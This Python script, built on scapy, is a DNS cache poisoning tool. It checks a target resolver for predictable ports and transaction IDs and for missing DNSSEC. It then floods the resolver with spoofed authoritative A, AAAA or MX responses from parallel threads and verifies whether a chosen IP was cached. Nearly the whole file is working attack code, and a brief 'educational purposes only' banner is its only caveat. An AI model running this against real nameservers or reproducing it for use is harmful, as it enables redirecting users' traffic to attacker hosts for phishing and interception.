#!/usr/bin/env python3

import socket
import sys
import random
import threading
import time
import argparse
import logging
import json
import os
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import *
from scapy.layers.dns import *

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class DNSCachePoisoner:
    def __init__(self, target_domain, nameserver, spoofed_ip, record_type='A', framework_mode=False):
        self.target_domain = target_domain
        self.nameserver = nameserver
        self.spoofed_ip = spoofed_ip
        self.record_type = record_type
        self.framework_mode = framework_mode
        self.transaction_id = random.randint(0, 65535)
        self.query_port = random.randint(1024, 65535)
        self.results = {
            'status': 'initialized',
            'target_domain': target_domain,
            'nameserver': nameserver,
            'record_type': record_type,
            'timestamp': datetime.now().isoformat(),
            'vulnerability_checks': [],
            'poisoning_attempts': [],
            'success_rate': 0.0,
            'summary': {
                'is_vulnerable': False,
                'vulnerabilities_found': [],
                'successful_poisoning': False,
                'risk_level': 'Unknown'
            }
        }

    def log_message(self, level, message):
        """Unified logging that respects framework mode"""
        if self.framework_mode:
            # In framework mode, only log errors or add to results
            if level == 'error':
                self.results['status'] = 'error'
                self.results['error'] = message
            elif level == 'warning':
                if 'warnings' not in self.results:
                    self.results['warnings'] = []
                self.results['warnings'].append(message)
        else:
            # In standalone mode, use logger
            if level == 'info':
                logger.info(message)
            elif level == 'warning':
                logger.warning(message)
            elif level == 'error':
                logger.error(message)

    def generate_dns_query(self, qtype='A'):
        """Generate a DNS query packet with specified record type"""
        return IP(dst=self.nameserver)/\
               UDP(sport=self.query_port, dport=53)/\
               DNS(rd=1, id=self.transaction_id,
                   qd=DNSQR(qname=self.target_domain, qtype=qtype))
    
    def generate_spoofed_response(self, qtype='A'):
        """Generate a spoofed DNS response packet"""
        response = IP(dst=self.nameserver)/\
                  UDP(sport=53, dport=self.query_port)/\
                  DNS(id=self.transaction_id,
                      qr=1,  # Response
                      aa=1,  # Authoritative
                      rd=1,  # Recursion Desired
                      ra=1,  # Recursion Available
                      qd=DNSQR(qname=self.target_domain, qtype=qtype))

        # Add appropriate resource record based on type
        if qtype == 'A':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='A',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'AAAA':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='AAAA',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'MX':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='MX',
                ttl=3600,
                rdata=f"10 mail.{self.target_domain}"
            )
        
        return response

    def check_source_port_randomization(self, num_queries=10):
        """Test if the DNS server uses random source ports"""
        self.log_message('info', "Testing source port randomization...")
        ports = set()
        
        for _ in range(num_queries):
            try:
                query = self.generate_dns_query()
                reply = sr1(query, timeout=2, verbose=0)
                if reply and UDP in reply:
                    ports.add(reply[UDP].sport)
                time.sleep(0.5)
            except Exception as e:
                self.log_message('warning', f"Error during port randomization check: {str(e)}")
        
        port_randomization = len(ports) > num_queries * 0.8
        check_result = {
            'check': 'source_port_randomization',
            'vulnerable': not port_randomization,
            'details': f"Unique ports observed: {len(ports)}/{num_queries}",
            'risk_level': 'High' if not port_randomization else 'Low'
        }
        self.results['vulnerability_checks'].append(check_result)
        
        if not port_randomization:
            self.results['summary']['vulnerabilities_found'].append('Predictable source ports')
            if self.results['summary']['risk_level'] != 'Critical':
                self.results['summary']['risk_level'] = 'High'
        
        return not port_randomization

    def check_txid_randomization(self, num_queries=10):
        """Test if the DNS server uses random transaction IDs"""
        self.log_message('info', "Testing transaction ID randomization...")
        txids = set()
        
        for _ in range(num_queries):
            try:
                query = self.generate_dns_query()
                reply = sr1(query, timeout=2, verbose=0)
                if reply and DNS in reply:
                    txids.add(reply[DNS].id)
                time.sleep(0.5)
            except Exception as e:
                self.log_message('warning', f"Error during TXID randomization check: {str(e)}")
        
        txid_randomization = len(txids) > num_queries * 0.8
        check_result = {
            'check': 'txid_randomization',
            'vulnerable': not txid_randomization,
            'details': f"Unique TXIDs observed: {len(txids)}/{num_queries}",
            'risk_level': 'High' if not txid_randomization else 'Low'
        }
        self.results['vulnerability_checks'].append(check_result)
        
        if not txid_randomization:
            self.results['summary']['vulnerabilities_found'].append('Predictable transaction IDs')
            if self.results['summary']['risk_level'] != 'Critical':
                self.results['summary']['risk_level'] = 'High'
        
        return not txid_randomization

    def detect_vulnerability(self):
        """Enhanced vulnerability detection with multiple checks"""
        self.log_message('info', f"Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
        
        vulnerabilities = []
        
        # Check source port randomization
        if self.check_source_port_randomization():
            vulnerabilities.append("Predictable source ports")
            
        # Check transaction ID randomization
        if self.check_txid_randomization():
            vulnerabilities.append("Predictable transaction IDs")
            
        # Check for DNSSEC
        try:
            query = self.generate_dns_query()
            reply = sr1(query, timeout=2, verbose=0)
            has_dnssec = False
            
            if reply and DNS in reply:
                if reply[DNS].ar and any(rr.type == 46 for rr in reply[DNS].ar):
                    has_dnssec = True
            
            check_result = {
                'check': 'dnssec',
                'vulnerable': not has_dnssec,
                'details': "DNSSEC not implemented",
                'risk_level': 'Medium' if not has_dnssec else 'Low'
            }
            self.results['vulnerability_checks'].append(check_result)
            
            if not has_dnssec:
                vulnerabilities.append("No DNSSEC protection")
                if self.results['summary']['risk_level'] == 'Unknown':
                    self.results['summary']['risk_level'] = 'Medium'
        except Exception as e:
            self.log_message('warning', f"Error during DNSSEC check: {str(e)}")
        
        # Update summary
        self.results['summary']['is_vulnerable'] = bool(vulnerabilities)
        if vulnerabilities:
            self.results['summary']['vulnerabilities_found'].extend(
                [v for v in vulnerabilities if v not in self.results['summary']['vulnerabilities_found']]
            )
        
        return bool(vulnerabilities), ", ".join(vulnerabilities) if vulnerabilities else "No obvious vulnerabilities detected"

    def poison_worker(self, attempt_id):
        """Worker function for parallel poisoning attempts"""
        try:
            legitimate_query = self.generate_dns_query(self.record_type)
            send(legitimate_query, verbose=0)
            
            # Send multiple spoofed responses with different transaction IDs
            for _ in range(50):
                self.transaction_id = random.randint(0, 65535)
                spoofed_response = self.generate_spoofed_response(self.record_type)
                send(spoofed_response, verbose=0)
            
            return attempt_id
        except Exception as e:
            self.log_message('warning', f"Error in poisoning worker {attempt_id}: {str(e)}")
            return None

    def poison_cache(self, duration=30, max_attempts=1000, max_workers=10):
        """Enhanced cache poisoning with parallel processing"""
        self.log_message('info', f"Attempting cache poisoning attack on {self.nameserver}")
        self.log_message('info', f"Target domain: {self.target_domain}")
        self.log_message('info', f"Spoofed IP: {self.spoofed_ip}")
        self.log_message('info', f"Record type: {self.record_type}")
        
        start_time = time.time()
        successful_attempts = 0
        total_attempts = 0
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                while time.time() - start_time < duration and total_attempts < max_attempts:
                    futures.append(
                        executor.submit(self.poison_worker, total_attempts)
                    )
                    total_attempts += 1
                    
                    # Process completed attempts
                    for future in as_completed(futures):
                        attempt_id = future.result()
                        if attempt_id is None:
                            continue
                        
                        # Verify if poisoning was successful
                        try:
                            verify_query = self.generate_dns_query(self.record_type)
                            reply = sr1(verify_query, timeout=2, verbose=0)
                            
                            if reply and DNS in reply and reply[DNS].an:
                                for rr in reply[DNS].an:
                                    if rr.rdata == self.spoofed_ip:
                                        successful_attempts += 1
                                        self.log_message('info', f"Successful poisoning detected! (Attempt {attempt_id})")
                            
                            if total_attempts % 10 == 0:
                                self.log_message('info', f"Made {total_attempts} attempts, {successful_attempts} successful...")
                        except Exception as e:
                            self.log_message('warning', f"Error verifying attempt {attempt_id}: {str(e)}")
                        
                        time.sleep(0.1)
        
        except KeyboardInterrupt:
            self.log_message('warning', "Attack interrupted by user")
        except Exception as e:
            self.log_message('error', f"Error during poisoning attack: {str(e)}")
        
        # Calculate success rate
        success_rate = (successful_attempts / total_attempts * 100) if total_attempts > 0 else 0
        attempt_result = {
            'total_attempts': total_attempts,
            'successful_attempts': successful_attempts,
            'success_rate': success_rate,
            'duration': time.time() - start_time
        }
        self.results['poisoning_attempts'].append(attempt_result)
        
        # Update summary
        self.results['success_rate'] = success_rate
        self.results['summary']['successful_poisoning'] = successful_attempts > 0
        
        if successful_attempts > 0:
            self.results['summary']['risk_level'] = 'Critical'
        
        self.log_message('info', f"Attack completed after {total_attempts} attempts")
        self.log_message('info', f"Success rate: {success_rate:.2f}%")
        
        return successful_attempts > 0

    def save_results(self, output_file):
        """Save attack results to a file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Update final status
            if self.results['status'] == 'initialized':
                self.results['status'] = 'completed'
            
            with open(output_path, 'w') as f:
                json.dump(self.results, f, indent=4)
            
            self.log_message('info', f"Results saved to {output_file}")
            
            # Return results for framework mode
            if self.framework_mode:
                return self.results
            
        except Exception as e:
            self.log_message('error', f"Error saving results: {str(e)}")
            if self.framework_mode:
                return {
                    'status': 'error',
                    'error': str(e)
                }

def main():
    parser = argparse.ArgumentParser(description='Enhanced DNS Cache Poisoning Tool')
    parser.add_argument('--target', required=True, help='Target domain to poison')
    parser.add_argument('--nameserver', required=True, help='DNS server to attack')
    parser.add_argument('--spoofed-ip', required=True, help='IP address to inject')
    parser.add_argument('--record-type', choices=['A', 'AAAA', 'MX'], default='A',
                       help='DNS record type to poison')
    parser.add_argument('--mode', choices=['detect', 'poison', 'both'], 
                       default='detect', help='Operation mode')
    parser.add_argument('--duration', type=int, default=30,
                       help='Duration of poisoning attempt in seconds')
    parser.add_argument('--max-attempts', type=int, default=1000,
                       help='Maximum number of poisoning attempts')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of parallel threads for poisoning')
    parser.add_argument('--output', type=str, default='dns_poison_results.json',
                       help='Output file for results')
    parser.add_argument('--framework-mode', action='store_true',
                       help='Run in framework integration mode')
    
    args = parser.parse_args()
    
    # Print warning message only in standalone mode
    if not args.framework_mode:
        print("""
        [!] WARNING: This tool is for educational purposes only.
        [!] Unauthorized DNS cache poisoning attempts are illegal.
        [!] Use only on systems you have permission to test.
        """)
    
    # Check if running as root/admin
    if os.geteuid() != 0:
        error_msg = "This script requires root/administrator privileges"
        if args.framework_mode:
            print(json.dumps({
                'status': 'error',
                'error': error_msg,
                'requires_root': True
            }))
        else:
            logger.error(error_msg)
        sys.exit(1)
    
    try:
        poisoner = DNSCachePoisoner(
            args.target,
            args.nameserver,
            args.spoofed_ip,
            args.record_type,
            args.framework_mode
        )
        
        if args.mode in ['detect', 'both']:
            vulnerable, message = poisoner.detect_vulnerability()
            if not args.framework_mode:
                logger.info("\nVulnerability Detection Results:")
                logger.info(f"Status: {'Vulnerable' if vulnerable else 'Not Vulnerable'}")
                logger.info(f"Details: {message}")
        
        if args.mode in ['poison', 'both']:
            if args.mode == 'both' and not vulnerable:
                poisoner.log_message('warning', "Server appears not vulnerable, but proceeding with poisoning attempt...")
            poisoner.poison_cache(
                duration=args.duration,
                max_attempts=args.max_attempts,
                max_workers=args.threads
            )
        
        # Save and return results
        results = poisoner.save_results(args.output)
        
        # In framework mode, print JSON results
        if args.framework_mode:
            print(json.dumps(results))
        
        return results
        
    except Exception as e:
        error_msg = str(e)
        if args.framework_mode:
            print(json.dumps({
                'status': 'error',
                'error': error_msg
            }))
        else:
            logger.error(f"An error occurred: {error_msg}")
        sys.exit(1)

if __name__ == "__main__":
    main() 